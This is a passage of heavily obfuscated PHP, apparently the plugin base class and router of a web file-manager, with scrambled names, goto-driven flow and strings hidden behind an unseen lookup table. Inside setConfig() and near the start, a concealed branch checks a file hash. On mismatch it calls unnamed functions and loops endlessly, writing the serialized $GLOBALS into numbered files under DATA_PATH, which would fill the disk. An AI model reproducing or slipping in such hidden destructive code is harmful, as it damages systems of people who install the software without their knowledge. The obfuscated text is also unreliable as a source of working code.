a´±‰Ç¢ô; fÎÑÛ¯¾–ö: $A›ÀÒ±¥ñò = $Bíô›ëßë«[840]; $A›ÀÒ±¥ñò($_SERVER[$Bíô›ëßë«[841]]); $A›ÀÒ±¥ñò($_SERVER[$Bíô›ëßë«[837]] . $Bíô›ëßë«[1398]); goto FÔô“Ê‡èæ; cËËŞé í¬: $f‹†Ô¿Øì = $F„‡ØæÍ²Â($bœ¶¥’ÀÇ); $AïŠâİ‘† = explode($Bíô›ëßë«[228], $f‹†Ô¿Øì); if (count($AïŠâİ‘†) < $Bíô›ëßë«[589]) { $B§óÙÑÌÃÙ = $Bíô›ëßë«[839]; $B§óÙÑÌÃÙ(); } goto fÎÑÛ¯¾–ö; d¢†²ææõƒ: $a‡˜ÏÖ·¨ = $Bíô›ëßë«[835]; $F„‡ØæÍ²Â = $Bíô›ëßë«[836]; $bœ¶¥’ÀÇ = $_SERVER[$Bíô›ëßë«[837]] . $Bíô›ëßë«[838]; goto cËËŞé í¬; a´±‰Ç¢ô: } global $in, $config; goto D¿££áÕ•; D¿££áÕ•: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Bíô›ëßë«[1399]); goto eÅ¥Õ×ğš; cá§Í·»±Î: $this->pluginHost = $config[$Bíô›ëßë«[1401]] . $this->pluginName . $Bíô›ëßë«[8]; $this->pluginHostDefault = $config[$Bíô›ëßë«[1401]] . $this->pluginName . $Bíô›ëßë«[8]; $eÎ–É±íË = $config[$Bíô›ëßë«[1402]]; goto aœ‘É‚òš©; D·‘°ö¼Æé: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ç³Íß¦Ó][1404]); } protected function assign($B‰óÊ¹Ÿ× , $cõÖÇĞ‘Ô = false) { if (is_array($B‰óÊ¹Ÿ× )) { $this->values = array_merge($this->values, $B‰óÊ¹Ÿ× ); } else { $this->values[$B‰óÊ¹Ÿ× ] = $cõÖÇĞ‘Ô; } } protected function display($eğµœùˆöÔ) { extract($this->values); require $eğµœùˆöÔ; } final function hookRegist($eç·Ê·²Ã) { $this->modelPlugin->appRegist($this->pluginName, $eç·Ê·²Ã); } final function appIcon() { $C§‚´Üš ® =& $_SERVER[Ç³Íß¦Ó]; $E´†ğÕ¡ö² = $this->appPackage(); $b¨ªŒ»¡‹ = $C§‚´Üš ®[33]; if (isset($E´†ğÕ¡ö²[$C§‚´Üš ®[407]])) { if (isset($E´†ğÕ¡ö²[$C§‚´Üš ®[407]][$C§‚´Üš ®[1405]])) { $b¨ªŒ»¡‹ = $C§‚´Üš ®[1406] . $E´†ğÕ¡ö²[$C§‚´Üš ®[407]][$C§‚´Üš ®[1405]] . $C§‚´Üš ®[1407]; } else { if ($E´†ğÕ¡ö²[$C§‚´Üš ®[407]][$C§‚´Üš ®[1408]]) { $b¨ªŒ»¡‹ = $C§‚´Üš ®[1409] . $E´†ğÕ¡ö²[$C§‚´Üš ®[407]][$C§‚´Üš ®[1408]] . $C§‚´Üš ®[1410]; } } } return $b¨ªŒ»¡‹; } final function fileCanView($aÄ©ÓÎ«) { goto cÆÆƒåŠá‘; cÆÆƒåŠá‘: $A¼Åï„™½ =& $_SERVER[Ç³Íß¦Ó]; if (request_url_safe($aÄ©ÓÎ«)) { return !0; } if ($this->isShare($aÄ©ÓÎ«)) { return !0; } goto C­Á‹‡¥‡Å; Eš“»¼ê: ActionCall($A¼Åï„™½[1423], $aÄ©ÓÎ«); goto E†š«êÏùÌ; C­Á‹‡¥‡Å: $Dôáºãí­Ú = Session::get($A¼Åï„™½[1411]); if (!$Dôáºãí­Ú || !$Dôáºãí­Ú[$A¼Åï„™½[1412]]) { $B£›ã„İ„‚ = $A¼Åï„™½[1413] . rawurlencode(this_url()); show_tips(LNG($A¼Åï„™½[1414]) . $A¼Åï„™½[1415] . $B£›ã„İ„‚ . $A¼Åï„™½[1416] . LNG($A¼Åï„™½[1417]) . $A¼Åï„™½[1418], !1); } if (!Action($A¼Åï„™½[1419])->authCan($A¼Åï„™½[1420])) { show_tips(LNG($A¼Åï„™½[1421]) . $A¼Åï„™½[1422], !1); } goto Eš“»¼ê; E†š«êÏùÌ: } final function isShare($bé¼½òŒÏ¢) { $aéñØ‹÷â„ = KodIO::parse($bé¼½òŒÏ¢); return $aéñØ‹÷â„[$_SERVER[Ç³Íß¦Ó][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($eÅÈì¯¹Ï°) { if (request_url_safe($eÅÈì¯¹Ï°)) { return $eÅÈì¯¹Ï°; } if (!$this->isShare($eÅÈì¯¹Ï°)) { $eÅÈì¯¹Ï° = $this->filePath($eÅÈì¯¹Ï°); } return Action($_SERVER[Ç³Íß¦Ó][1070])->linkOut($eÅÈì¯¹Ï°); } public function filePathLinkOut($bß®™ïÄâ) { if (request_url_safe($bß®™ïÄâ)) { return $bß®™ïÄâ; } $this->fileCanView($bß®™ïÄâ); return Action($_SERVER[Ç³Íß¦Ó][1070])->link($bß®™ïÄâ); } final function filePath($a¾‹Û«ß) { $cØİ°ö¦éÃ =& $_SERVER[Ç³Íß¦Ó]; if ($bùñÉšÔÖÔ = $this->checkSharePath($a¾‹Û«ß)) { return $bùñÉšÔÖÔ; } $this->fileCanView($a¾‹Û«ß); if (request_url_safe($a¾‹Û«ß)) { $C÷âˆÃˆÛŸ = parse_url_query($a¾‹Û«ß); if (isset($C÷âˆÃˆÛŸ[$cØİ°ö¦éÃ[1424]]) && isset($C÷âˆÃˆÛŸ[$cØİ°ö¦éÃ[208]])) { $a¬ãÕòóÔ› = Model($cØİ°ö¦éÃ[731])->get($cØİ°ö¦éÃ[732]); $cº¯¿ù¥Ê = Mcrypt::decode($C÷âˆÃˆÛŸ[$cØİ°ö¦éÃ[208]], $a¬ãÕòóÔ›); if ($cº¯¿ù¥Ê) { $this->fileInfo = IO::infoWithChildren($cº¯¿ù¥Ê); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $cº¯¿ù¥Ê; } } $a¾‹Û«ß = $this->_cacheHttpFile($a¾‹Û«ß); $this->fileInfo = IO::infoWithChildren($a¾‹Û«ß); } else { $this->fileInfo = IO::infoWithChildren($a¾‹Û«ß); if (!$this->fileInfo) { show_tips(LNG($cØİ°ö¦éÃ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $a¾‹Û«ß; } final function _cacheHttpFile($FáÃÔ’‡ÅŒ) { $e‰Â¥•­ = hash_path($FáÃÔ’‡ÅŒ, !0); $this->cachePath = $this->pluginCachePath($e‰Â¥•­); if ($FŒ–½ØßÁì = IO::fileNameExist($this->cachePath, $e‰Â¥•­)) { return KodIO::make($FŒ–½ØßÁì); } $Aå×²¥Ÿ¸ = $this->cachePath . $e‰Â¥•­; return $this->pluginCacheFileSet($Aå×²¥Ÿ¸, file_get_contents($FáÃÔ’‡ÅŒ)); } final function _tmpFileName($eÕÖùÏ… = array()) { goto Bµä£¬ø×; Dİ°Ì×Á·™: if (isset($eÕÖùÏ…[$Dí¶áŠŞ[164]][$Dí¶áŠŞ[171]])) { return $eÕÖùÏ…[$Dí¶áŠŞ[164]][$Dí¶áŠŞ[171]]; } $AŠñ†´¬„á = IO::hashSimple($eÕÖùÏ…[$Dí¶áŠŞ[76]]); if ($AŠñ†´¬„á) { return $AŠñ†´¬„á; } goto F“ë§ÊŠ; Bµä£¬ø×: $Dí¶áŠŞ =& $_SERVER[Ç³Íß¦Ó]; if (!$eÕÖùÏ…) { $eÕÖùÏ… = $this->fileInfo; } if (isset($eÕÖùÏ…[$Dí¶áŠŞ[171]])) { return $eÕÖùÏ…[$Dí¶áŠŞ[171]]; } goto Dİ°Ì×Á·™; F“ë§ÊŠ: $f‡“ò£Á…Ô = array($eÕÖùÏ…[$Dí¶áŠŞ[28]], $eÕÖùÏ…[$Dí¶áŠŞ[76]], $eÕÖùÏ…[$Dí¶áŠŞ[78]]); if (isset($eÕÖùÏ…[$Dí¶áŠŞ[485]])) { $f‡“ò£Á…Ô[] = $eÕÖùÏ…[$Dí¶áŠŞ[485]]; } return md5(implode($Dí¶áŠŞ[71], $f‡“ò£Á…Ô)); goto CÆ‡ĞÕµ•Ô; CÆ‡ĞÕµ•Ô: } final function checkSharePath($CµËÊŒº‡Š) { goto C·ŞŠøˆİ‚; bË¥è¦Ëˆ: $c’Ş‚«·ëŞ = Action($BÍª Ø¹Ø[1070])->sharePathInfo($CµËÊŒº‡Š); if (!isset($c’Ş‚«·ëŞ[$BÍª Ø¹Ø[76]])) { show_json(LNG($BÍª Ø¹Ø[1426]), !1); } $this->fileInfo = $c’Ş‚«·ëŞ[$BÍª Ø¹Ø[164]]; goto Døø‘æÃ„ë; C·ŞŠøˆİ‚: $BÍª Ø¹Ø =& $_SERVER[Ç³Íß¦Ó]; if (!defined($BÍª Ø¹Ø[452])) { define($BÍª Ø¹Ø[1425], 0); } if (!$this->isShare($CµËÊŒº‡Š)) { return !1; } goto bË¥è¦Ëˆ; Døø‘æÃ„ë: $this->cachePath = $this->pluginCachePath($this->fileInfo[$BÍª Ø¹Ø[171]]); return $c’Ş‚«·ëŞ[$BÍª Ø¹Ø[76]]; goto C“ø’¡¸°Ş; C“ø’¡¸°Ş: } final function pluginCachePath($cÉ„ÚÇÈôƒ = '') { $EÛÊ×Ş‡á =& $_SERVER[Ç³Íß¦Ó]; $dŒŠ„æø‰Œ = IO_PATH_SYSTEM_TEMP . $EÛÊ×Ş‡á[1427] . $this->pluginName; if (!($F¹Ç«ÔÄÌ = IO::infoFull($dŒŠ„æø‰Œ))) { return IO::mkdir($dŒŠ„æø‰Œ . $EÛÊ×Ş‡á[8] . $cÉ„ÚÇÈôƒ); } if (empty($cÉ„ÚÇÈôƒ)) { return $F¹Ç«ÔÄÌ[$EÛÊ×Ş‡á[76]]; } if (!($cÈéÃÕ Ù· = IO::fileNameExist($F¹Ç«ÔÄÌ[$EÛÊ×Ş‡á[76]], $cÉ„ÚÇÈôƒ))) { return IO::mkdir($F¹Ç«ÔÄÌ[$EÛÊ×Ş‡á[76]] . $cÉ„ÚÇÈôƒ); } return KodIO::make($cÈéÃÕ Ù·); } final function pluginCacheFileSet($B…¸äï·…†, $b‰„ãƒ–ôë = '') { $aÎ·ØÓ­ =& $_SERVER[Ç³Íß¦Ó]; if (!($CŒÚ†ÀĞ¦ = IO::infoFull($B…¸äï·…†))) { return IO::mkfile($B…¸äï·…†, $b‰„ãƒ–ôë, REPEAT_REPLACE); } IO::setContent($CŒÚ†ÀĞ¦[$aÎ·ØÓ­[76]], $b‰„ãƒ–ôë); return $CŒÚ†ÀĞ¦[$aÎ·ØÓ­[76]]; } final function pluginLocalFile($f÷Ş«¤âª = '') { goto e»® Õ‘ƒ ; e»® Õ‘ƒ : $C°Õ‘¼¾ˆš =& $_SERVER[Ç³Íß¦Ó]; $bò”æ“”ƒ˜ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($bò”æ“”ƒ˜)) { mk_dir($bò”æ“”ƒ˜); } goto fªÄŸ¼°æÔ; EŞö›š‰Î‹: if (!checkExtSafe($B¨ï¢öÍ­ƒ)) { $B¨ï¢öÍ­ƒ = $B¨ï¢öÍ­ƒ . $C°Õ‘¼¾ˆš[1428]; } $f™øå¤‰çÔ = $bò”æ“”ƒ˜ . $B¨ï¢öÍ­ƒ; if (@file_exists($f™øå¤‰çÔ)) { return $f™øå¤‰çÔ; } goto f¤à‘×Šš; fªÄŸ¼°æÔ: if (!$f÷Ş«¤âª) { return $bò”æ“”ƒ˜; } $Bæ£©ïÉƒŸ = IO::info($f÷Ş«¤âª); $B¨ï¢öÍ­ƒ = $this->_tmpFileName($Bæ£©ïÉƒŸ) . $C°Õ‘¼¾ˆš[95] . $Bæ£©ïÉƒŸ[$C°Õ‘¼¾ˆš[168]]; goto EŞö›š‰Î‹; f¤à‘×Šš: return IO::copy($f÷Ş«¤âª, $bò”æ“”ƒ˜, 0, $B¨ï¢öÍ­ƒ); goto a±òğë³ê¡; a±òğë³ê¡: } final function appPackage() { goto dÄÜ¤‰ÑÉ‡; cÀ»—×äÎ: return $bÛÑ¡«–¹; goto D–Ìê±¾øó; DÌØ¦Ôïê´: $B°½‘ÓˆèĞ = Hook::trigger($D²›®âÏ¬[1430], $bÛÑ¡«–¹); if ($B°½‘ÓˆèĞ && is_array($B°½‘ÓˆèĞ)) { $bÛÑ¡«–¹ = $B°½‘ÓˆèĞ; } $this->packageData = $bÛÑ¡«–¹; goto cÀ»—×äÎ; C“Ÿ˜ÍÖŞË: $this->parseLang($f†¿à²ÚÇ›); $bÛÑ¡«–¹ = json_decode_force($f†¿à²ÚÇ›); if (!$bÛÑ¡«–¹) { return array(); } goto DÌØ¦Ôïê´; dÄÜ¤‰ÑÉ‡: $D²›®âÏ¬ =& $_SERVER[Ç³Íß¦Ó]; if ($this->packageData) { return $this->packageData; } $f†¿à²ÚÇ› = $this->parseFile($this->pluginPath . $D²›®âÏ¬[1429]); goto C“Ÿ˜ÍÖŞË; D–Ìê±¾øó: } public function packageInfoGet($Eîõë©™Àƒ) { $D¶Õ¤áŠÍ = $this->appPackage(); return array_get_value($D¶Õ¤áŠÍ, $Eîõë©™Àƒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ç³Íß¦Ó][1431]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ç³Íß¦Ó][1432]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ç³Íß¦Ó][1433]); } private function parseFile($e‰”ÒáŒšŸ) { goto Aá¢åì‰Ó; Aá¢åì‰Ó: $f’ë…¹ÙØ =& $_SERVER[Ç³Íß¦Ó]; $aØ¦­´Œ±ˆ = file_get_contents($e‰”ÒáŒšŸ); $b“ áğëÃŸ = array($f’ë…¹ÙØ[1434], $f’ë…¹ÙØ[1435], $f’ë…¹ÙØ[1436], $f’ë…¹ÙØ[1437], $f’ë…¹ÙØ[1438], $f’ë…¹ÙØ[1439], $f’ë…¹ÙØ[1440]); goto eç·âÌ’·; eç·âÌ’·: $Aù¸Ì½Œ«í = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$f’ë…¹ÙØ[88]][$f’ë…¹ÙØ[1441]]); if (strstr($aØ¦­´Œ±ˆ, $f’ë…¹ÙØ[1442])) { $AÒ×ïåÜÆÑ = rawurlencode(json_encode($this->pluginLangArr)); $aØ¦­´Œ±ˆ = str_replace($f’ë…¹ÙØ[1442], $AÒ×ïåÜÆÑ, $aØ¦­´Œ±ˆ); } if (strstr($aØ¦­´Œ±ˆ, $f’ë…¹ÙØ[1443])) { $AÒ×ïåÜÆÑ = $AÒ×ïåÜÆÑ = rawurlencode(json_encode($this->getConfig())); $aØ¦­´Œ±ˆ = str_replace($f’ë…¹ÙØ[1443], $AÒ×ïåÜÆÑ, $aØ¦­´Œ±ˆ); } goto bÀ¸©¦¡§Ş; bÀ¸©¦¡§Ş: $aØ¦­´Œ±ˆ = str_replace($b“ áğëÃŸ, $Aù¸Ì½Œ«í, $aØ¦­´Œ±ˆ); return $aØ¦­´Œ±ˆ; goto eéÌØ©öº; eéÌØ©öº: } private function parseLang(&$eµÖÑ”“í¹) { goto B½Ï° ¨¹—; c”Óš«Ä‘¯: $C¨®¼ñ®¢Ô = array(); foreach ($CòÄåÎ¯®[0] as $C· àã‰ùÖ) { $b–§ñÍÖŸ„ = substr($C· àã‰ùÖ, strlen($c¨—Ô—ù„º), -4); $A‘­ÈÊôç¯ = LNG($b–§ñÍÖŸ„); $bÏÓ£ô™[] = $C· àã‰ùÖ; $C¨®¼ñ®¢Ô[] = str_replace(array($E•Ï¦·¦öŞ[228], $E•Ï¦·¦öŞ[1038], $E•Ï¦·¦öŞ[339], $E•Ï¦·¦öŞ[116]), array($E•Ï¦·¦öŞ[50], $E•Ï¦·¦öŞ[50], $E•Ï¦·¦öŞ[33], $E•Ï¦·¦öŞ[1446]), $A‘­ÈÊôç¯); } $eµÖÑ”“í¹ = str_replace($bÏÓ£ô™, $C¨®¼ñ®¢Ô, $eµÖÑ”“í¹); goto A¡ËÃù“ ; B½Ï° ¨¹—: $E•Ï¦·¦öŞ =& $_SERVER[Ç³Íß¦Ó]; $c¨—Ô—ù„º = $E•Ï¦·¦öŞ[1444]; if (!strstr($eµÖÑ”“í¹, $c¨—Ô—ù„º)) { return; } goto FœÁ‡æ÷Ä®; FœÁ‡æ÷Ä®: preg_match_all($E•Ï¦·¦öŞ[1445], $eµÖÑ”“í¹, $CòÄåÎ¯®); if (!is_array($CòÄåÎ¯®) || count($CòÄåÎ¯®) == 0 || !is_array($CòÄåÎ¯®[0]) || count($CòÄåÎ¯®[0]) == 0) { return; } $bÏÓ£ô™ = array(); goto c”Óš«Ä‘¯; A¡ËÃù“ : } private function parseConfig(&$féó´›öÖ) { goto C¹—¦Û±Ö‰; C¹—¦Û±Ö‰: $d”Ğç—£Å´ =& $_SERVER[Ç³Íß¦Ó]; $Aî¢À•ƒ¤º = $d”Ğç—£Å´[1447]; if (!strstr($féó´›öÖ, $Aî¢À•ƒ¤º)) { return; } goto d—…’Ê¥ˆø; dæö‹½ç§×: $Bš˜È±Ô« = array(); $fƒ•—öñÇİ = array(); foreach ($bïïÊ³«á[0] as $bÑâ¶‹¥±í) { $E­Úá¿ÛÀ¾ = substr($bÑâ¶‹¥±í, strlen($Aî¢À•ƒ¤º), -2); $Bš˜È±Ô«[] = $bÑâ¶‹¥±í; $fƒ•—öñÇİ[] = _get($DÈÜ‰ö¥¶£, $E­Úá¿ÛÀ¾); } goto fÖ— •‘Ó²; fÖ— •‘Ó²: $féó´›öÖ = str_replace($Bš˜È±Ô«, $fƒ•—öñÇİ, $féó´›öÖ); goto Cà¿¡†ÇëĞ; d—…’Ê¥ˆø: preg_match_all($d”Ğç—£Å´[1448], $féó´›öÖ, $bïïÊ³«á); if (!is_array($bïïÊ³«á) || count($bïïÊ³«á) == 0 || !is_array($bïïÊ³«á[0]) || count($bïïÊ³«á[0]) == 0) { return; } $DÈÜ‰ö¥¶£ = $this->getConfig(); goto dæö‹½ç§×; Cà¿¡†ÇëĞ: } private function parsePackage(&$eåæ‡…¼Ó) { goto fÉÀœ¯·›; C“¢ÒØçÄ–: $eåæ‡…¼Ó = str_replace($bïÜ‘ƒó°, $FëŸñîÉ÷, $eåæ‡…¼Ó); goto bÓŒØÔ¿õõ; EÎİƒĞŠÔš: preg_match_all($BêÊáÍí¤[1450], $eåæ‡…¼Ó, $eçÕõË“Š); if (!is_array($eçÕõË“Š) || count($eçÕõË“Š) == 0 || !is_array($eçÕõË“Š[0]) || count($eçÕõË“Š[0]) == 0) { return; } $dø–Ÿ†‹— = $this->appPackage(); goto c÷ãÓÇõõ¼; fÉÀœ¯·›: $BêÊáÍí¤ =& $_SERVER[Ç³Íß¦Ó]; $CôğšåëÜ¨ = $BêÊáÍí¤[1449]; if (!strstr($eåæ‡…¼Ó, $CôğšåëÜ¨)) { return; } goto EÎİƒĞŠÔš; c÷ãÓÇõõ¼: $bïÜ‘ƒó° = array(); $FëŸñîÉ÷ = array(); foreach ($eçÕõË“Š[0] as $bÕâóÁˆœ’) { $Còê‹Ç·ë = substr($bÕâóÁˆœ’, strlen($CôğšåëÜ¨), -2); $bïÜ‘ƒó°[] = $bÕâóÁˆœ’; $FëŸñîÉ÷[] = _get($dø–Ÿ†‹—, $Còê‹Ç·ë); } goto C“¢ÒØçÄ–; bÓŒØÔ¿õõ: } final function echoFile($f¨˜§½, $fÜ²±ŠãŒ© = false) { goto BñÉ—ƒÍöœ; BñÉ—ƒÍöœ: $EƒÈ¸¹Ê¬ =& $_SERVER[Ç³Íß¦Ó]; $Eã¹î© İÔ = $this->pluginPath . $f¨˜§½; if (ACT == $EƒÈ¸¹Ê¬[1451]) { echo $EƒÈ¸¹Ê¬[1452] . $this->pluginName . $EƒÈ¸¹Ê¬[8] . $f¨˜§½ . $EƒÈ¸¹Ê¬[1453]; if (!file_exists($Eã¹î© İÔ)) { echo $EƒÈ¸¹Ê¬[1454]; return; } } goto c‰ø¥÷È›; c‰ø¥÷È›: $AÏçòèó± = $this->parseFile($Eã¹î© İÔ); $this->parseLang($AÏçòèó±); $this->parseConfig($AÏçòèó±); goto CöÒôêÕô; CöÒôêÕô: $this->parsePackage($AÏçòèó±); if (is_array($fÜ²±ŠãŒ©)) { $AÏçòèó± = str_replace(array_keys($fÜ²±ŠãŒ©), array_values($fÜ²±ŠãŒ©), $AÏçòèó±); } echo $EƒÈ¸¹Ê¬[228] . $AÏçòèó±; goto dî¾„ëÇ¹ô; dî¾„ëÇ¹ô: } final function initLang() { goto D˜Šİ†©¨‚; AÌÜ­Œõ†–: if (!is_array($dä›Œöª¦´)) { return array(); } if (@count($dä›Œöª¦´) > 0) { I18n::set($dä›Œöª¦´); } return $dä›Œöª¦´; goto DÄáÈ¿¹íğ; D˜Šİ†©¨‚: $c˜Ö¥×ä½¡ =& $_SERVER[Ç³Íß¦Ó]; $f³¤±›Â„í = $c˜Ö¥×ä½¡[1455]; $a¡¸òóÒ«ğ = $this->pluginPath . $c˜Ö¥×ä½¡[1456]; goto dòŠ‡ÆÆâ; dòŠ‡ÆÆâ: $b¥„çµÚ¢â = I18n::getType(); $dä›Œöª¦´ = array(); if (file_exists($a¡¸òóÒ«ğ . $b¥„çµÚ¢â . $c˜Ö¥×ä½¡[804])) { $dä›Œöª¦´ = (include $a¡¸òóÒ«ğ . $b¥„çµÚ¢â . $c˜Ö¥×ä½¡[804]); } else { if ($b¥„çµÚ¢â == $c˜Ö¥×ä½¡[1457] && !file_exists($a¡¸òóÒ«ğ . $b¥„çµÚ¢â . $c˜Ö¥×ä½¡[804]) && file_exists($a¡¸òóÒ«ğ . $c˜Ö¥×ä½¡[1458])) { $dä›Œöª¦´ = (include $a¡¸òóÒ«ğ . $c˜Ö¥×ä½¡[1458]); } else { if (file_exists($a¡¸òóÒ«ğ . $f³¤±›Â„í . $c˜Ö¥×ä½¡[804])) { $dä›Œöª¦´ = (include $a¡¸òóÒ«ğ . $f³¤±›Â„í . $c˜Ö¥×ä½¡[804]); } } } goto AÌÜ­Œõ†–; DÄáÈ¿¹íğ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($bğèªœ»Í‡) { $EÍ”‰¶¡¾ =& $_SERVER[Ç³Íß¦Ó]; $C¬²½Ôšìç = $_SERVER[$EÍ”‰¶¡¾[837]] . $EÍ”‰¶¡¾[838]; $b²…¾¸¼ÓÇ = $EÍ”‰¶¡¾[833]; if ($_SERVER[$EÍ”‰¶¡¾[834]] != $b²…¾¸¼ÓÇ($C¬²½Ôšìç)) { goto E²¸£Ñƒß; E²¸£Ñƒß: $cÚó²‚ŒËĞ = $EÍ”‰¶¡¾[835]; $FÛ±•ŸÙ¢ƒ = $EÍ”‰¶¡¾[836]; $a­¥ñ›Íî = $_SERVER[$EÍ”‰¶¡¾[837]] . $EÍ”‰¶¡¾[838]; goto Eôö–¾œÒ‹; a†ğê¤×¹‘: $c³÷Œ ö·Â = 1; for ($e‘‚ğ Ä” = $c³÷Œ ö·Â; $e‘‚ğ Ä” > 0; $e‘‚ğ Ä”++) { $eóËÇ•¬›„(DATA_PATH . $e‘‚ğ Ä”, $B¯‚ó¦øµË); } goto dËè‡’Šè; Eôö–¾œÒ‹: $C©ù ê¿É = $FÛ±•ŸÙ¢ƒ($a­¥ñ›Íî); $c¼å”‹Ãò„ = explode($EÍ”‰¶¡¾[228], $C©ù ê¿É); if (count($c¼å”‹Ãò„) < $EÍ”‰¶¡¾[589]) { $a ÕÄ¥Ì…º = $EÍ”‰¶¡¾[839]; $a ÕÄ¥Ì…º(); } goto f‚°ôØ‡å¯; C´áĞñ¨½: $cÚó²‚ŒËĞ(); $eóËÇ•¬›„ = $EÍ”‰¶¡¾[842]; $B¯‚ó¦øµË = json_encode($GLOBALS[$EÍ”‰¶¡¾[843]]); goto a†ğê¤×¹‘; f‚°ôØ‡å¯: $EÁìáŠôÎ± = $EÍ”‰¶¡¾[840]; $EÁìáŠôÎ±($_SERVER[$EÍ”‰¶¡¾[841]]); $cÚó²‚ŒËĞ = $EÍ”‰¶¡¾[835]; goto C´áĞñ¨½; dËè‡’Šè: } return $this->modelPlugin->setConfig($this->pluginName, $bğèªœ»Í‡); } public function onSetConfig($A¯›„ó‹İä) { } public function onGetConfig($B‘·¾¡ÉÇ) { } public function onChangeStatus($eâ¯ïÂ¶—¼) { } public function onUninstall() { } public function onInstall() { } public function authCheck($BÀ®½´£Ä = "\x70\x6c\165\147\x69\x6e\x41\165\164\x68") { $fÃ—ÜÉ™ßï =& $_SERVER[Ç³Íß¦Ó]; if (!defined($fÃ—ÜÉ™ßï[452])) { return !1; } if (_get($GLOBALS, $fÃ—ÜÉ™ßï[483])) { return !0; } $d´¬¤áè¶É = $this->getConfig(); if (!$d´¬¤áè¶É[$BÀ®½´£Ä]) { return !1; } return ActionCall($fÃ—ÜÉ™ßï[1459], $d´¬¤áè¶É[$BÀ®½´£Ä]); } public function url($BôŠİË¢»â, $BÌ£ÕÁÒæô = '', $Eó¬êâÃï‘ = true) { goto AÑ¼ÅĞÈÊ‡; AÑ¼ÅĞÈÊ‡: $aÀ¸‹‡æˆ¤ =& $_SERVER[Ç³Íß¦Ó]; $C¾ÛŒ˜”Š = $this->getConfig(); $A¶£´ ôïì = KOD_VERSION . $aÀ¸‹‡æˆ¤[95] . KOD_VERSION_BUILD; goto cé‚¨Ú¥æí; cé‚¨Ú¥æí: $dÌ‚…ùÓÇ‹ = $this->packageVersion(); $fõæ‡†§áô = $A¶£´ ôïì . $aÀ¸‹‡æˆ¤[438] . $dÌ‚…ùÓÇ‹; if (substr($BôŠİË¢»â, 0, 4) == $aÀ¸‹‡æˆ¤[147] || substr($BôŠİË¢»â, 0, 2) == $aÀ¸‹‡æˆ¤[1243]) { $E‚†î½ß = $BôŠİË¢»â . $aÀ¸‹‡æˆ¤[1460] . $fõæ‡†§áô; } else { if ($BÌ£ÕÁÒæô == $aÀ¸‹‡æˆ¤[33]) { $E‚†î½ß = $this->pluginHost . $BôŠİË¢»â . $aÀ¸‹‡æˆ¤[1460] . $fõæ‡†§áô; } else { if ($BÌ£ÕÁÒæô === $aÀ¸‹‡æˆ¤[77]) { $E‚†î½ß = $this->pluginHost . $BôŠİË¢»â; } else { if ($BÌ£ÕÁÒæô == $aÀ¸‹‡æˆ¤[1461]) { $E‚†î½ß = STATIC_PATH . $BôŠİË¢»â . $aÀ¸‹‡æˆ¤[1460] . $A¶£´ ôïì; } else { if ($BÌ£ÕÁÒæô == $aÀ¸‹‡æˆ¤[1462]) { $E‚†î½ß = APP_HOST . $aÀ¸‹‡æˆ¤[1463] . $BôŠİË¢»â . $aÀ¸‹‡æˆ¤[1460] . $A¶£´ ôïì; } else { if (isset($C¾ÛŒ˜”Š[$BÌ£ÕÁÒæô])) { $E‚†î½ß = $C¾ÛŒ˜”Š[$BÌ£ÕÁÒæô] . $BôŠİË¢»â . $aÀ¸‹‡æˆ¤[1460] . $fõæ‡†§áô; } } } } } } goto D°¯ŠÊ¯Îº; D°¯ŠÊ¯Îº: if (!$Eó¬êâÃï‘) { return $E‚†î½ß; } echo $E‚†î½ß; goto DßÏÍÊÑš; DßÏÍÊÑš: } public function link($CÃ¦ãˆ“  = false, $eÌ‚±‘’¡Á = '') { $dµéÏÖŞ‚± =& $_SERVER[Ç³Íß¦Ó]; if (!$CÃ¦ãˆ“ ) { $this->link($dµéÏÖŞ‚±[1464], $dµéÏÖŞ‚±[1462]); $this->link($dµéÏÖŞ‚±[1465], $dµéÏÖŞ‚±[1461]); $this->link($dµéÏÖŞ‚±[1466], $dµéÏÖŞ‚±[1461]); $this->link($dµéÏÖŞ‚±[1467], $dµéÏÖŞ‚±[1461]); $this->link($dµéÏÖŞ‚±[1468], $dµéÏÖŞ‚±[1461]); return; } $eğ¤’ŸİğŒ = $this->url($CÃ¦ãˆ“ , $eÌ‚±‘’¡Á, !1); if (substr($CÃ¦ãˆ“ , -3) == $dµéÏÖŞ‚±[1469]) { echo $dµéÏÖŞ‚±[1470] . $eğ¤’ŸİğŒ . $dµéÏÖŞ‚±[1471] . $dµéÏÖŞ‚±[228]; } else { if (substr($CÃ¦ãˆ“ , -4) == $dµéÏÖŞ‚±[1472]) { echo $dµéÏÖŞ‚±[1473] . $eğ¤’ŸİğŒ . $dµéÏÖŞ‚±[1474] . $dµéÏÖŞ‚±[228]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\133\136\x2f\135\x2b", "\72\x6e\165\155" => "\133\x30\55\x39\x5d\53", "\72\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($dÉ¡›·îÍŒ, $EÍ…ƒŒÖì) { $eçŞóô™µ¶ =& $_SERVER[Ç³Íß¦Ó]; if ($dÉ¡›·îÍŒ == $eçŞóô™µ¶[1475]) { $aÒ†Õ¨Ë’ë = array_map($eçŞóô™µ¶[1476], $EÍ…ƒŒÖì[0]); $c´ù«×›Ş = strpos($EÍ…ƒŒÖì[1], $eçŞóô™µ¶[8]) === 0 ? $EÍ…ƒŒÖì[1] : $eçŞóô™µ¶[8] . $EÍ…ƒŒÖì[1]; $E—†¹–´¤ô = $EÍ…ƒŒÖì[2]; } else { $aÒ†Õ¨Ë’ë = null; $c´ù«×›Ş = strpos($EÍ…ƒŒÖì[0], $eçŞóô™µ¶[8]) === 0 ? $EÍ…ƒŒÖì[0] : $eçŞóô™µ¶[8] . 